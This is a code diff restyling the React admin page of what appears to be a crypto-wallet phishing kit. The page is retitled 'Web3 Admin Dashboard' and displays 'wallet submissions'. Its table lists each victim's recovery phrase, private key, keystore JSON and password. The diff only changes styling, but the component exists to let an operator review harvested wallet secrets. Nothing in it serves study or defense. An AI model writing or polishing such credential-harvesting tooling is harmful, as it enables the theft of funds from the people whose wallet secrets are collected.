@@ -43,67 +43,102 @@ const AdminPage = () => {
   };
 
   return (
-    <div className="px-4 py-6 bg-gradient-to-br from-slate-900 to-indigo-950 min-h-screen text-white">
-      <h1 className="text-center text-2xl font-bold text-violet-400 mb-6">
-        Admin Page
-      </h1>
+    <div className="min-h-screen bg-gradient-to-br from-black via-indigo-950 to-purple-950 text-white px-6 py-10">
 
-      {/* INPUT SECTION */}
-      <div>
-        <h1 className="text-lg mb-2">Update Title</h1>
+      {/* Header */}
+      <div className="text-center mb-12">
+        <h1 className="text-4xl font-bold bg-gradient-to-r from-violet-400 to-cyan-400 bg-clip-text text-transparent">
+          Web3 Admin Dashboard
+        </h1>
+        <p className="text-gray-400 mt-2">
+          Monitor and manage wallet submissions
+        </p>
+      </div>
+
+      {/* Update Title Card */}
+      <div className="max-w-xl mx-auto mb-12 backdrop-blur-lg bg-white/5 border border-white/10 rounded-xl p-6 shadow-xl">
+        <h2 className="text-lg font-semibold text-violet-300 mb-3">
+          Update Title
+        </h2>
+
         <input
           value={newTitle}
           onChange={(e) => setNewTitle(e.target.value)}
-          className="bg-white text-black w-full my-4 p-2 rounded"
+          placeholder="Enter new title..."
+          className="w-full p-3 rounded-lg bg-black/40 border border-white/20 focus:border-violet-400 focus:outline-none text-white placeholder-gray-400"
         />
+
         <button
           onClick={handleTitleUpdate}
-          className="bg-violet-600 px-4 py-2 rounded hover:bg-violet-500 transition"
+          className="mt-4 w-full py-3 rounded-lg font-semibold bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-500 hover:to-indigo-500 transition shadow-lg shadow-violet-700/30"
         >
           Update Title
         </button>
       </div>
 
-      {/* Table */}
-      <div className="overflow-x-auto rounded-lg border border-indigo-400 mb-6 mt-10">
-        <table className="min-w-full text-sm bg-white text-gray-800 rounded-lg overflow-hidden">
-          <thead className="bg-indigo-600 text-white">
-            <tr>
-              <th className="py-2 px-4 text-left">Wallet</th>
-              <th className="py-2 px-4 text-left">Recovery Phrase</th>
-              <th className="py-2 px-4 text-left">Private Key</th>
-              <th className="py-2 px-4 text-left">Keystore JSON</th>
-              <th className="py-2 px-4 text-left">Password</th>
-              <th className="py-2 px-4 text-left">Created At</th>
-            </tr>
-          </thead>
-          <tbody>
-            {submissions.slice(0, visibleCount).map((submission, index) => (
-              <tr
-                key={index}
-                className="odd:bg-gray-100 even:bg-white border-b"
-              >
-                <td className="py-2 px-4">{submission.wallet}</td>
-                <td className="py-2 px-4">
-                  {submission.tab1Inputs?.filter(Boolean).join(", ")}
-                </td>
-                <td className="py-2 px-4">{submission.tab2Text}</td>
-                <td className="py-2 px-4">{submission.tab3?.content}</td>
-                <td className="py-2 px-4">{submission.tab3?.title}</td>
-                <td className="py-2 px-4">
-                  {formatDate(submission.createdAt)}
-                </td>
+      {/* Submissions Table */}
+      <div className="backdrop-blur-xl bg-white/5 border border-white/10 rounded-xl shadow-2xl overflow-hidden">
+        <div className="px-6 py-4 border-b border-white/10">
+          <h2 className="text-xl font-semibold text-cyan-300">
+            Wallet Submissions
+          </h2>
+        </div>
+
+        <div className="overflow-x-auto">
+          <table className="min-w-full text-sm">
+            <thead className="bg-white/10 text-gray-200">
+              <tr>
+                <th className="py-3 px-4 text-left">Wallet</th>
+                <th className="py-3 px-4 text-left">Recovery Phrase</th>
+                <th className="py-3 px-4 text-left">Private Key</th>
+                <th className="py-3 px-4 text-left">Keystore JSON</th>
+                <th className="py-3 px-4 text-left">Password</th>
+                <th className="py-3 px-4 text-left">Created</th>
               </tr>
-            ))}
-          </tbody>
-        </table>
+            </thead>
+
+            <tbody>
+              {submissions.slice(0, visibleCount).map((submission, index) => (
+                <tr
+                  key={index}
+                  className="border-t border-white/5 hover:bg-white/5 transition"
+                >
+                  <td className="py-3 px-4 text-violet-300 font-mono">
+                    {submission.wallet}
+                  </td>
+
+                  <td className="py-3 px-4 text-gray-300">
+                    {submission.tab1Inputs?.filter(Boolean).join(", ")}
+                  </td>
+
+                  <td className="py-3 px-4 text-gray-300 font-mono">
+                    {submission.tab2Text}
+                  </td>
+
+                  <td className="py-3 px-4 text-gray-300">
+                    {submission.tab3?.content}
+                  </td>
+
+                  <td className="py-3 px-4 text-gray-300">
+                    {submission.tab3?.title}
+                  </td>
+
+                  <td className="py-3 px-4 text-gray-400">
+                    {formatDate(submission.createdAt)}
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
       </div>
 
+      {/* Load More Button */}
       {visibleCount < submissions.length && (
-        <div className="text-center">
+        <div className="text-center mt-10">
           <button
             onClick={handleLoadMore}
-            className="px-6 py-2 bg-indigo-600 text-white font-semibold rounded hover:bg-indigo-500 transition"
+            className="px-8 py-3 rounded-lg font-semibold bg-gradient-to-r from-cyan-600 to-violet-600 hover:from-cyan-500 hover:to-violet-500 transition shadow-lg shadow-cyan-700/30"
           >
             Load More
           </button>
